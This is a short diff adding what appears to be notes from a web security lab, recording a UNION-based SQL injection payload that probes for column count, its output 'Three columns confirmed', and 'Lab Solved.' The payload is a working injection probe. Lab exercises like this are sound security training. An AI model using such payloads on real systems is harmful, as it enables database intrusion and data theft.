@@ -1,0 +1,11 @@
+HTTP/2 200 OK
+
+Payload
+
+' UNION SELECT NULL,NULL,NULL--
+
+Result
+
+Three columns confirmed.
+
+Lab Solved.
